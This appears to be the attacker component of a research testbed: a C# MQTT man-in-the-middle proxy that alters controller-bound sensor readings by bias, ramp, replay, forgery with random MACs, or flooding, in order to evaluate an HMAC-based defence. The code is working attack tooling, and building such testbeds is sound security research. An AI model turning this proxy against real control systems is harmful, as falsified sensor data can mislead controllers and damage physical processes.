// LoopShield attacker: an on-path man-in-the-middle on the controller's link.
//
// The controller connects to port 1883 (this proxy), which forwards to the
// real broker on 1884. That is the position an attacker gets on an
// unencrypted network (ARP spoofing, rogue AP, compromised switch). It never
// touches either node's firmware and does not know the HMAC key.
//
// Outside the attack window it is a transparent relay, so every experiment,
// attacked or not, goes through exactly the same network path.
//
//   LoopShield.Attacker --mode bias --start 30 --duration 120 [--bias -3]
//
// Modes (all act on broker -> controller sg/sensor traffic):
//   none     relay only
//   bias     add a constant offset to every reading         --bias -3
//   ramp     add an offset growing linearly in time         --ramp -0.01   (degC/s)
//   replay   record the last N s of genuine readings, then
//            replace live readings with the recording       --record 30
//   forgery  after each genuine reading, inject a fabricated
//            one with the next seq number and a fake value  --forge-value 18
//   flood    inject random sensor messages at a high rate   --flood-rate 1000  (msg/s)
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Text.Json;
using LoopShield.Attacker;
using LoopShield.Shared;

CultureInfo.DefaultThreadCurrentCulture = CultureInfo.InvariantCulture;
CultureInfo.CurrentCulture = CultureInfo.InvariantCulture;

var opt = AttackOptions.Parse(args);
var log = new EventLog(opt.LogPath);
var stats = new Counters();
var rng = new Random(opt.Seed);

long Now() => DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
long launch = Now();
long startMs = opt.StartUnixMs ?? launch + (long)(opt.StartS * 1000);
long stopMs = startMs + (long)(opt.DurationS * 1000);
bool Active(long t) => opt.Mode != "none" && t >= startMs && t < stopMs;

log.Write("launch", new { mode = opt.Mode, start_unix_ms = startMs, stop_unix_ms = stopMs, opt = opt.ToString() });
Console.WriteLine($"attacker: mode={opt.Mode} listen :{opt.Listen} -> {opt.UpstreamHost}:{opt.UpstreamPort}");
Console.WriteLine($"          attack window {DateTimeOffset.FromUnixTimeMilliseconds(startMs).ToLocalTime():HH:mm:ss.fff} " +
                  $"+ {opt.DurationS:F0} s");

// Genuine sensor payloads with arrival time, for replay.
var history = new ConcurrentQueue<(long T, byte[] Payload)>();
List<byte[]>? replayTape = null;
int replayIdx = 0;

// The connection currently relaying to the controller, for injection.
Downstream? current = null;

using var cts = new CancellationTokenSource();
Console.CancelKeyPress += (_, e) => { e.Cancel = true; cts.Cancel(); };
AppDomain.CurrentDomain.ProcessExit += (_, _) => { log.Write("exit", stats.Snapshot()); log.Dispose(); };

_ = Task.Run(() => PhaseWatcher(cts.Token));
if (opt.Mode == "flood") _ = Task.Run(() => Flooder(cts.Token));

var listener = new TcpListener(IPAddress.Any, opt.Listen);
listener.Start();
try
{
    while (!cts.IsCancellationRequested)
    {
        var client = await listener.AcceptTcpClientAsync(cts.Token);
        _ = Task.Run(() => Relay(client, cts.Token));
    }
}
catch (OperationCanceledException) { }
finally { listener.Stop(); }

// ---------------------------------------------------------------------------

async Task Relay(TcpClient client, CancellationToken ct)
{
    client.NoDelay = true;
    var remote = client.Client.RemoteEndPoint?.ToString();
    using var upstream = new TcpClient { NoDelay = true };
    try
    {
        await upstream.ConnectAsync(opt.UpstreamHost, opt.UpstreamPort, ct);
    }
    catch (Exception ex)
    {
        log.Write("upstream_fail", new { remote, error = ex.Message });
        client.Dispose();
        return;
    }
    Console.WriteLine($"{DateTime.Now:HH:mm:ss.fff} relay up for {remote}");

    var cs = client.GetStream();
    var us = upstream.GetStream();

    // The client's CONNECT tells us the protocol version, which changes the
    // PUBLISH layout (esp-mqtt uses 3.1.1; MQTTnet defaults to 5.0).
    bool v5;
    try
    {
        var connect = await MqttFrame.ReadAsync(cs, ct);
        if (connect is null || connect.PacketType != 1) { client.Dispose(); return; }
        v5 = connect.ConnectProtocolLevel() == 5;
        await us.WriteAsync(connect.ToBytes(), ct);
    }
    catch (Exception ex) when (ex is IOException or InvalidDataException or OperationCanceledException)
    {
        client.Dispose();
        return;
    }
    var down = new Downstream(cs, v5);
    log.Write("connect", new { remote, mqtt = v5 ? "5.0" : "3.1.1" });
    current = down;

    using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
    // Client -> broker: untouched byte copy.
    var c2b = cs.CopyToAsync(us, linked.Token);
    // Broker -> client: frame by frame, through the attack.
    var b2c = PumpDown(us, down, linked.Token);

    await Task.WhenAny(c2b, b2c);
    linked.Cancel();
    if (current == down) current = null;
    client.Dispose();
    log.Write("disconnect", new { remote });
    Console.WriteLine($"{DateTime.Now:HH:mm:ss.fff} relay down for {remote}");
}

async Task PumpDown(Stream from, Downstream to, CancellationToken ct)
{
    try
    {
        while (await MqttFrame.ReadAsync(from, ct) is { } f)
        {
            if (!f.IsPublish)
            {
                await to.WriteAsync(f, ct);
                continue;
            }
            var (topic, payload) = f.ParsePublish(to.V5);
            if (topic != Topics.Sensor)
            {
                await to.WriteAsync(f, ct);
                continue;
            }
            foreach (var outFrame in OnSensor(f, payload, to.V5))
            {
                await to.WriteAsync(outFrame, ct);
            }
        }
    }
    catch (Exception ex) when (ex is IOException or OperationCanceledException or ObjectDisposedException) { }
}

// Decides what the controller sees in place of one genuine sensor message.
IEnumerable<MqttFrame> OnSensor(MqttFrame original, byte[] payload, bool v5)
{
    long t = Now();
    Interlocked.Increment(ref stats.SensorSeen);

    if (!Active(t))
    {
        if (opt.Mode == "replay" && t < startMs)
        {
            history.Enqueue((t, payload));
            while (history.TryPeek(out var h) && h.T < t - (long)(opt.RecordS * 1000) - 2000) history.TryDequeue(out _);
        }
        yield return original;
        yield break;
    }

    SgMessage.TryDecode(payload, out var m);
    switch (opt.Mode)
    {
        case "bias":
            Interlocked.Increment(ref stats.Modified);
            yield return MqttFrame.Publish(Topics.Sensor, (m with { Value = m.Value + (float)opt.Bias }).Encode(), v5);
            break;

        case "ramp":
            Interlocked.Increment(ref stats.Modified);
            float off = (float)(opt.Ramp * (t - startMs) / 1000.0);
            yield return MqttFrame.Publish(Topics.Sensor, (m with { Value = m.Value + off }).Encode(), v5);
            break;

        case "replay":
            if (replayTape is { Count: > 0 })
            {
                Interlocked.Increment(ref stats.Replayed);
                yield return MqttFrame.Publish(Topics.Sensor, replayTape[replayIdx++ % replayTape.Count], v5);
            }
            else
            {
                yield return original;
            }
            break;

        case "forgery":
            yield return original;
            Interlocked.Increment(ref stats.Injected);
            yield return MqttFrame.Publish(Topics.Sensor, Forge(m.Seq + 1, m.TimestampMs + 50, (float)opt.ForgeValue), v5);
            break;

        default:    // flood: genuine traffic still flows; Flooder() injects
            yield return original;
            break;
    }
}

// A message that looks right (version, type, MAC flag set) but whose MAC is
// random bytes: the attacker does not have the key.
byte[] Forge(uint seq, ulong ts, float value)
{
    ulong mac;
    lock (rng) mac = (ulong)rng.NextInt64();
    return new SgMessage(SgMessageType.Sensor, seq, ts, value, SgMessage.FlagMac, mac).Encode();
}

async Task Flooder(CancellationToken ct)
{
    const int TickMs = 10;
    double perTick = opt.FloodRate * TickMs / 1000.0, carry = 0;
    using var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(TickMs));
    while (await timer.WaitForNextTickAsync(ct))
    {
        if (!Active(Now()) || current is not { } down) continue;
        carry += perTick;
        int n = (int)carry;
        carry -= n;
        for (int i = 0; i < n; i++)
        {
            uint seq; float value;
            lock (rng) { seq = (uint)rng.Next(); value = (float)(rng.NextDouble() * 50); }
            try
            {
                await down.WriteAsync(MqttFrame.Publish(Topics.Sensor, Forge(seq, (ulong)Now(), value), down.V5), ct);
                Interlocked.Increment(ref stats.Injected);
            }
            catch (Exception ex) when (ex is IOException or ObjectDisposedException) { break; }
        }
    }
}

async Task PhaseWatcher(CancellationToken ct)
{
    try
    {
        await Task.Delay(TimeSpan.FromMilliseconds(Math.Max(0, startMs - Now())), ct);
        if (opt.Mode == "replay")
        {
            long from = startMs - (long)(opt.RecordS * 1000);
            replayTape = history.Where(h => h.T >= from && h.T < startMs).Select(h => h.Payload).ToList();
        }
        if (opt.Mode != "none")
        {
            log.Write("attack_start", new { replay_tape = replayTape?.Count });
            Console.WriteLine($"{DateTime.Now:HH:mm:ss.fff} ATTACK START ({opt.Mode})");
        }
        await Task.Delay(TimeSpan.FromMilliseconds(Math.Max(0, stopMs - Now())), ct);
        if (opt.Mode != "none")
        {
            log.Write("attack_stop", stats.Snapshot());
            Console.WriteLine($"{DateTime.Now:HH:mm:ss.fff} ATTACK STOP  {JsonSerializer.Serialize(stats.Snapshot())}");
        }
    }
    catch (OperationCanceledException) { }
}

// ---------------------------------------------------------------------------

sealed class Downstream(Stream s, bool v5)
{
    public bool V5 { get; } = v5;

    private readonly SemaphoreSlim _lock = new(1, 1);

    public async Task WriteAsync(MqttFrame f, CancellationToken ct)
    {
        var bytes = f.ToBytes();
        await _lock.WaitAsync(ct);
        try { await s.WriteAsync(bytes, ct); }
        finally { _lock.Release(); }
    }
}

sealed class Counters
{
    public long SensorSeen, Modified, Replayed, Injected;
    public object Snapshot() => new
    {
        sensor_seen = Interlocked.Read(ref SensorSeen),
        modified = Interlocked.Read(ref Modified),
        replayed = Interlocked.Read(ref Replayed),
        injected = Interlocked.Read(ref Injected),
    };
}

sealed class EventLog : IDisposable
{
    private readonly StreamWriter? _w;
    private readonly object _lock = new();

    public EventLog(string? path)
    {
        if (path is null) return;
        Directory.CreateDirectory(Path.GetDirectoryName(Path.GetFullPath(path))!);
        _w = new StreamWriter(path, append: true) { AutoFlush = true };
    }

    public void Write(string ev, object data)
    {
        if (_w is null) return;
        var line = JsonSerializer.Serialize(new { unix_ms = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(), @event = ev, data });
        lock (_lock) _w.WriteLine(line);
    }

    public void Dispose() { lock (_lock) _w?.Dispose(); }
}

record AttackOptions(string Mode, int Listen, string UpstreamHost, int UpstreamPort,
                     long? StartUnixMs, double StartS, double DurationS,
                     double Bias, double Ramp, double RecordS, double ForgeValue, double FloodRate,
                     int Seed, string? LogPath)
{
    static readonly string[] Modes = ["none", "bias", "ramp", "replay", "forgery", "flood"];

    public static AttackOptions Parse(string[] a)
    {
        string? Get(string key)
        {
            int i = Array.IndexOf(a, key);
            return i >= 0 && i + 1 < a.Length ? a[i + 1] : null;
        }
        double D(string k, double d) => Get(k) is { } s ? double.Parse(s, CultureInfo.InvariantCulture) : d;

        var mode = Get("--mode") ?? "none";
        if (!Modes.Contains(mode))
        {
            Console.Error.WriteLine($"unknown mode '{mode}'. modes: {string.Join(", ", Modes)}");
            Environment.Exit(2);
        }
        var upstream = (Get("--upstream") ?? $"localhost:{Ports.Broker}").Split(':');
        return new AttackOptions(
            Mode: mode,
            Listen: (int)D("--listen", Ports.Link),
            UpstreamHost: upstream[0],
            UpstreamPort: int.Parse(upstream[1]),
            StartUnixMs: Get("--start-unix") is { } su ? long.Parse(su) : null,
            StartS: D("--start", 10),
            DurationS: D("--duration", 60),
            Bias: D("--bias", -3),
            Ramp: D("--ramp", -0.01),
            RecordS: D("--record", 30),
            ForgeValue: D("--forge-value", 18),
            FloodRate: D("--flood-rate", 1000),
            Seed: (int)D("--seed", 7),
            LogPath: Get("--log"));
    }
}
